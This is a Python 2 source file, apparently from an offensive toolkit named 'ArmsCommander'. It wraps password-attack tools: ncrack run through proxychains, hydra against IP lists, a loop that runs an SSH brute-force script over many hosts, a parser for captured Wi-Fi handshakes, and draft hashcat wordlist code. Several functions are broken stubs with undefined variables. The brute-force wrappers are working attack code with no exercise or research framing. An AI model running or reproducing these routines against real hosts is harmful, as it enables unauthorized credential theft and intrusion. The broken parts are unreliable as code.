#Define execution policies
#!/usr/bin/env python
# coding=UTF-8

#import modules
import os
import socket
import operator
from termcolor import colored
import sys
import StringIO
sys.stdout.write("\x1b[8;{rows};{cols}t".format(rows=64, cols=200)) # sets window to full screen
import re
import time

cocaine_factory_wordlist = '/root/ArmsCommander/passwordattacks/CocaineFactory/wordlist'
progress_wordlist = '/root/ArmsCommander/passwordattacks/CocaineFactory/progress'
CF_temp_file = cocaine_factory_wordlist + '_temp'

def debug_text(text_display):
    print colored('DEBUG PROMPT: ' + text_display,'red',attrs=['bold'])
    return

def progress_writer():
    # import lines
    # search for "completed" in line, if true, the line is set to a variable and marked for deletion
    # or "comment out the line"
    return

def marked_finished_file_on_wordlist(file_to_mark): # need to set up a "mark the wordlist for each file started"
    timestr = time.strftime("%Y%m%d-%H%M%S")

    w = open(cocaine_factory_wordlist,'a+')
    debug_text('File opened')
    print colored('File opened is: %s','red',attrs=['bold']) % cocaine_factory_wordlist
    line = w.readline()
    debug_text(line)
    sentence = line
    debug_text(line)
    with open(cocaine_factory_wordlist,'a+') as w:
        sentence = str(line)
        for sentence in w:
            if re.findall(file_to_mark, sentence):
                # sentence_marked = file_to_mark.replace(file_to_mark,'\n### STARTED CRACKING PROCESS AT %s ### ' + file_to_mark) % timestr # marks the line to prevent it from being repeaterd by the iterator
                sentence_marked = '### HASHCAT STARTED AT %s: %s' % (timestr, file_to_mark)
                debug_text(sentence_marked)

                # backs up the original file as file.save
                cmd_String = 'sudo cp -r %s %s.save' % (cocaine_factory_wordlist, cocaine_factory_wordlist)
                os.system(cmd_String)

                # then open a new version of the file
                temp_file = cocaine_factory_wordlist + '_temp'

                # open temp file
                a = open(temp_file, 'a+')
                a.write(sentence_marked)
                a.close()

# this should be moved or copied over to the Wireless Attacks Menu. This is not actually reconnaissance.
def pyrit_to_csv(pyrit_analyze_output_file): # searches pyrit files for handshakes, organizes it by good, workable, or bad
# warning this is draft code. This is a parser for Pyrit output. To convert it to csv format to better organize captured handshakes .cap files
    pyrit_log_dir = '/root/ArmsCommander/logs/Pyrit/'
    pyrit_log_csv = pyrit_log_dir + 'Capture_Files_Analysis_log_parsed.csv'

    r = open(pyrit_analyze_output_file,'r')
    w = open(pyrit_log_csv,'a+')

    with open(pyrit_analyze_output_file,'r') as r:
        line = r.readline()
        sentence = str(line)
        for sentence in r:

            if re.findall('Parsing file',str(sentence)):
                Capture_File = sentence
                Capture_File = Capture_File.replace("Parsing file '","")
                Capture_File = Capture_File.replace("'","")
                Capture_File = Capture_File.replace(" (1/1)...","")

            if re.findall('AccessPoint',str(sentence)): #1: AccessPoint 78:24:af:ed:ab:a0 ('Prettyfly4awifi'):
                Wifi_AP = sentence.split()
                # Wifi_AP = sentence.replace('AccessPoint','')
                Wifi_MAC_BSSID = Wifi_AP[2]
                Wifi_ESSID = Wifi_AP[3]
                Wifi_ESSID = Wifi_ESSID.replace("('","")
                Wifi_ESSID = Wifi_ESSID.replace("'):","")


            if re.findall('Station',str(sentence)):   #1: Station 60:6d:c7:8b:ef:20, 3 handshake(s):
                try:
                    Wifi_Client = sentence.split()
                    Wifi_Client_MAC = Wifi_Client[2]
                    Wifi_Client_MAC = Wifi_Client_MAC.replace(',','')
                    Wifi_Client_Handshakes_Count = Wifi_Client[3]

                except IndexError:
                    Wifi_Client_Handshakes_Count = 'No handshakes captured'
                    print colored('ERROR: No handshakes were captured in this provided file, moving right along','red',attrs=['bold'])
                except IOError:
                    Wifi_Client_Handshakes_Count = 'INCOMPLETE CAPTURE FILE ERROR'
                    print colored('ERROR: The packets are shown by libpcap as incomplete, moving right along','red',attrs=['bold'])
                write_string = '\nESSID:,%s,BSSID:,%s,HANDSHAKES:,%s,CLIENT MAC:,%s,CAPTURE FILE:,%s' % (Wifi_ESSID, Wifi_MAC_BSSID, Wifi_Client_Handshakes_Count, Wifi_Client_MAC, Capture_File)
                print colored(write_string,'yellow',attrs=['bold'])
                w.write(write_string)
        r.close()
        w.close()
        print colored('Pyrit Analysis converted into CSV file: %s','green',attrs=['bold']) % pyrit_log_csv

    return pyrit_log_csv


# There really isnt a need to mark the hccapx files cracked or not-cracked, the hashcat pot files are actually fairly intelligent in its own right
# The hccapx internal potfile keeps track of which hashes are cracked or exhausted, or untouched
def CF_process_one(cocaine_factory_wordlist, pw_attack_type, hash_file, timestr): # writes a temporary, alternative wordlist each time process one finishes a job
    return CF_temp_file

def CF_process_two(cocaine_factory_wordlist, pw_attack_type, hash_file, timestr): # writes the time the current hash file is completed in cracking (when hashcat goes to the next hash)
    return CF_temp_file

def CF_process_three(): # saves the temp wordlist as PERMANENT in place of the original
# it should be manually run by command or by a keypress to avoid messing with people's data
    return new_save_file

# make sure to ALWAYS open the files as 'a+'

def erase_finished_file_off_wordlist():
    timestr = time.strftime("%Y%m%d-%H%M%S")

    w = open(cocaine_factory_wordlist,'a+')
    w.readline()
    sentence = line
    with open(cocaine_factory_wordlist,'a+') as w:
        sentence = str(line)
        for sentence in w:
            if re.findall(file_to_mark, sentence):
                sentence.replace(sentence,'Wordlist entry deleted at: %s') % timestr # deletes the line to prevent it from being repeaterd by the iterator
    w.close()
    return

# ncrack commands has invalid charcter error not much help online so we are switching to hydra
def ncrack_ip_list(username_list, password_list, ip_list, port):
    timestr = time.strftime("%Y%m%d-%H%M%S")
    cmd_String = "sudo proxychains ncrack -U %s -P %s -T 5 -iL %s -p %s -oN /root/ArmsCommander/logs/ncrack/%s.txt" % (username_list, password_list, ip_list, port, timestr)
    os.system(cmd_String)
    return

def hydra_ip_list(username_list, password_list, ip_list, protocol):
    cmd_String = "hydra -L %s -P %s -M %s %s" % (username_list, password_list, ip_list, protocol)
    print colored(cmd_String,'yellow',attrs=['bold'])
    os.system(cmd_String)
    return

def ssh_brute_forcer(IP_wordlist, password_wordlist):
    r = open(IP_wordlist, 'r')
    username = str(raw_input("Enter a USERNAME like 'Admin' or 'Administrator' or 'root': "))
    with open(IP_wordlist, 'r') as r:
        line = r.readline().strip()
        sentence = str(line)
        for sentence in r:
            host = sentence
            cmd_String = "python /root/ArmsCommander/passwordattacks/sshBrute.py -H %s -u %s -F %s" % (host, username, password_wordlist)
            cmd_String = cmd_String.replace('\n','')
            print colored('Now brute forcing passwords against TARGET: %s, USERNAME: %s, PASSWORD WORDLIST: %s','yellow',attrs=['bold']) % (host, username, password_wordlist)
            os.system(cmd_String)
            print colored(cmd_String,'red',attrs=['bold'])
    return

def broken_ssh_brute_forcer(IP_wordlist, user_wordlist, password_wordlist): # moved toe password_toolkits
# broken wont go to next IP

    r = open(IP_wordlist, 'r')
    u = open(user_wordlist, 'r')
    with open(IP_wordlist, 'r') as r:
    # while True:
        line = r.readline().strip()
        sentence = str(line)
        for sentence in r:
            with open(user_wordlist, 'r'):
                u_line = u.readline().strip()
                username = str(u_line)
                for username in u:
                    host = line
                    cmd_String = "python /root/ArmsCommander/passwordattacks/sshBrute.py -H %s -u %s -F %s" % (host, username, password_wordlist)
                    cmd_String = cmd_String.replace('\n','')
                    print colored('Now brute forcing passwords against TARGET: %s, USERNAME: %s, PASSWORD WORDLIST: %s','yellow',attrs=['bold']) % (host, username, password_wordlist)
                    os.system(cmd_String)
                    print colored(cmd_String,'red',attrs=['bold'])
    return
